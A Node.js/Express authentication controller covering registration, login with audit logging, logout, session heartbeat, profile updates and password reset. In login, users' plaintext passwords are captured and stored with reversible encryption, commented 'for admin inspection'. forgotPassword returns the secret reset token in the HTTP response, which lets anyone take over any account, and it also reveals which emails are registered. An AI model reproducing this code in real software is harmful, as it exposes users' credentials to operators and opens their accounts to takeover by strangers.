import crypto from 'crypto';
import User from '../models/User.js';
import AuthLog from '../models/AuthLog.js';
import { encryptSecret } from '../utils/encryptionUtil.js';

// Helper to extract device and browser information from request
export const parseClientInfo = (req) => {
  const ua = req.headers['user-agent'] || '';
  const ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || req.socket?.remoteAddress || req.ip || '127.0.0.1';

  let browser = 'Unknown Browser';
  if (ua.includes('Edg/')) browser = 'Microsoft Edge';
  else if (ua.includes('Chrome/')) browser = 'Google Chrome';
  else if (ua.includes('Firefox/')) browser = 'Mozilla Firefox';
  else if (ua.includes('Safari/') && !ua.includes('Chrome')) browser = 'Apple Safari';
  else if (ua.includes('OPR/') || ua.includes('Opera/')) browser = 'Opera';

  let os = 'Unknown OS';
  if (ua.includes('Windows NT 10.0')) os = 'Windows 10/11';
  else if (ua.includes('Windows')) os = 'Windows';
  else if (ua.includes('Mac OS X')) os = 'macOS';
  else if (ua.includes('Android')) os = 'Android';
  else if (ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';
  else if (ua.includes('Linux')) os = 'Linux';

  let device = 'Desktop';
  if (/mobile|android|iphone|ipad|tablet/i.test(ua)) {
    device = /ipad|tablet/i.test(ua) ? 'Tablet' : 'Mobile';
  }

  return { ip, browser, os, device, ua };
};

export const register = async (req, res, next) => {
  try {
    const { name, email, password, title, location } = req.body;
    if (!name || !email || !password) {
      return res.status(400).json({ success: false, message: 'Name, email and password are required' });
    }
    const exists = await User.findOne({ email: email.toLowerCase() });
    if (exists) return res.status(400).json({ success: false, message: 'Email already registered' });

    const clientInfo = parseClientInfo(req);
    const user = await User.create({
      name,
      email: email.toLowerCase(),
      password,
      title,
      location,
      role: 'user',
      status: 'active',
      isOnline: true,
      lastLoginAt: new Date(),
      lastActiveAt: new Date(),
      lastLoginIp: clientInfo.ip,
    });

    const token = user.generateAuthToken();

    // Log the initial registration & login event
    await AuthLog.create({
      userId: user._id,
      email: user.email,
      name: user.name,
      role: user.role,
      action: 'login',
      status: 'success',
      isLive: true,
      ipAddress: clientInfo.ip,
      userAgent: clientInfo.ua,
      browser: clientInfo.browser,
      os: clientInfo.os,
      device: clientInfo.device,
      loginAt: new Date(),
      lastActiveAt: new Date(),
    });

    res.status(201).json({
      success: true,
      token,
      user: {
        id: user._id,
        name: user.name,
        email: user.email,
        role: user.role,
        title: user.title,
      },
    });
  } catch (err) { next(err); }
};

export const login = async (req, res, next) => {
  try {
    const { email, password } = req.body;
    const clientInfo = parseClientInfo(req);

    if (!email || !password) {
      return res.status(400).json({ success: false, message: 'Email and password required' });
    }

    const user = await User.findOne({ email: email.toLowerCase() }).select('+password +encryptedPassword');

    // Failed login: user doesn't exist
    if (!user) {
      await AuthLog.create({
        email: email.toLowerCase(),
        action: 'failed_login',
        status: 'failed',
        failureReason: 'User not found with this email',
        ipAddress: clientInfo.ip,
        userAgent: clientInfo.ua,
        browser: clientInfo.browser,
        os: clientInfo.os,
        device: clientInfo.device,
      });
      return res.status(401).json({ success: false, message: 'Invalid email or password' });
    }

    // Check account status
    if (user.status === 'suspended') {
      await AuthLog.create({
        userId: user._id,
        email: user.email,
        name: user.name,
        role: user.role,
        action: 'failed_login',
        status: 'failed',
        failureReason: 'Account suspended by administrator',
        ipAddress: clientInfo.ip,
        userAgent: clientInfo.ua,
        browser: clientInfo.browser,
        os: clientInfo.os,
        device: clientInfo.device,
      });
      return res.status(403).json({ success: false, message: 'Your account has been suspended. Please contact administrator.' });
    }

    // Failed login: invalid password
    const isMatch = await user.comparePassword(password);
    if (!isMatch) {
      await AuthLog.create({
        userId: user._id,
        email: user.email,
        name: user.name,
        role: user.role,
        action: 'failed_login',
        status: 'failed',
        failureReason: 'Incorrect password',
        ipAddress: clientInfo.ip,
        userAgent: clientInfo.ua,
        browser: clientInfo.browser,
        os: clientInfo.os,
        device: clientInfo.device,
      });
      return res.status(401).json({ success: false, message: 'Invalid email or password' });
    }

    // Success login
    const token = user.generateAuthToken();

    // Auto-capture and encrypt plain password with AES-256 for admin inspection
    if (!user.encryptedPassword) {
      user.encryptedPassword = encryptSecret(password);
    }

    // Mark previous live sessions as inactive
    await AuthLog.updateMany(
      { userId: user._id, isLive: true },
      { $set: { isLive: false, logoutAt: new Date() } }
    );

    // Update user online status
    user.isOnline = true;
    user.lastLoginAt = new Date();
    user.lastActiveAt = new Date();
    user.lastLoginIp = clientInfo.ip;
    await user.save({ validateBeforeSave: false });

    // Create active auth log
    await AuthLog.create({
      userId: user._id,
      email: user.email,
      name: user.name,
      role: user.role || 'user',
      action: 'login',
      status: 'success',
      isLive: true,
      ipAddress: clientInfo.ip,
      userAgent: clientInfo.ua,
      browser: clientInfo.browser,
      os: clientInfo.os,
      device: clientInfo.device,
      loginAt: new Date(),
      lastActiveAt: new Date(),
    });

    res.json({
      success: true,
      token,
      user: {
        id: user._id,
        name: user.name,
        email: user.email,
        role: user.role || 'user',
        status: user.status || 'active',
        title: user.title,
        gmailConnected: user.gmailConnected,
        gmailEmail: user.gmailEmail,
      },
    });
  } catch (err) { next(err); }
};

export const logout = async (req, res, next) => {
  try {
    const userId = req.user._id;
    const clientInfo = parseClientInfo(req);

    // Find latest live log for this user
    const liveLog = await AuthLog.findOne({ userId, isLive: true }).sort({ createdAt: -1 });
    const now = new Date();

    if (liveLog) {
      const durationMin = liveLog.loginAt ? Math.round((now.getTime() - new Date(liveLog.loginAt).getTime()) / 60000) : 0;
      liveLog.isLive = false;
      liveLog.logoutAt = now;
      liveLog.sessionDurationMinutes = durationMin;
      await liveLog.save();
    }

    // Create logout record
    await AuthLog.create({
      userId,
      email: req.user.email,
      name: req.user.name,
      role: req.user.role,
      action: 'logout',
      status: 'success',
      isLive: false,
      ipAddress: clientInfo.ip,
      userAgent: clientInfo.ua,
      browser: clientInfo.browser,
      os: clientInfo.os,
      device: clientInfo.device,
      logoutAt: now,
    });

    // Update user offline status
    await User.findByIdAndUpdate(userId, {
      isOnline: false,
      lastActiveAt: now,
    });

    res.json({ success: true, message: 'Logged out successfully' });
  } catch (err) { next(err); }
};

export const heartbeat = async (req, res, next) => {
  try {
    const userId = req.user._id;
    const now = new Date();

    await User.findByIdAndUpdate(userId, {
      isOnline: true,
      lastActiveAt: now,
    });

    await AuthLog.findOneAndUpdate(
      { userId, isLive: true },
      { $set: { lastActiveAt: now } }
    );

    res.json({ success: true, timestamp: now });
  } catch (err) { next(err); }
};

export const getMe = async (req, res, next) => {
  try {
    const user = await User.findById(req.user.id).select('-password -gmailTokens');
    if (user) {
      user.isOnline = true;
      user.lastActiveAt = new Date();
      await user.save({ validateBeforeSave: false });
    }
    res.json({ success: true, user });
  } catch (err) { next(err); }
};

export const updateProfile = async (req, res, next) => {
  try {
    const { name, title, location, phone, preferredRoles, preferredLocations, experienceYears, settings } = req.body;
    const user = await User.findByIdAndUpdate(
      req.user.id,
      { name, title, location, phone, preferredRoles, preferredLocations, experienceYears, settings },
      { new: true, runValidators: true }
    ).select('-password -gmailTokens');
    res.json({ success: true, user });
  } catch (err) { next(err); }
};

export const forgotPassword = async (req, res, next) => {
  try {
    const { email } = req.body;
    if (!email) return res.status(400).json({ success: false, message: 'Email is required' });
    const user = await User.findOne({ email: email.toLowerCase() });
    if (!user) return res.status(404).json({ success: false, message: 'No account found with this email' });

    const resetToken = crypto.randomBytes(32).toString('hex');
    user.resetPasswordToken = crypto.createHash('sha256').update(resetToken).digest('hex');
    user.resetPasswordExpire = Date.now() + 10 * 60 * 1000;
    await user.save();

    res.json({
      success: true,
      message: 'Password reset token generated. In production this would be emailed.',
      resetToken,
      resetUrl: `${process.env.FRONTEND_URL || 'http://localhost:5173'}/reset-password?token=${resetToken}`
    });
  } catch (err) { next(err); }
};

export const resetPassword = async (req, res, next) => {
  try {
    const { token, password } = req.body;
    if (!token || !password) return res.status(400).json({ success: false, message: 'Token and new password required' });
    const hashed = crypto.createHash('sha256').update(token).digest('hex');
    const user = await User.findOne({
      resetPasswordToken: hashed,
      resetPasswordExpire: { $gt: Date.now() }
    });
    if (!user) return res.status(400).json({ success: false, message: 'Invalid or expired reset token' });

    user.password = password;
    user.resetPasswordToken = undefined;
    user.resetPasswordExpire = undefined;
    await user.save();

    res.json({ success: true, message: 'Password reset successful. You can now login.' });
  } catch (err) { next(err); }
};
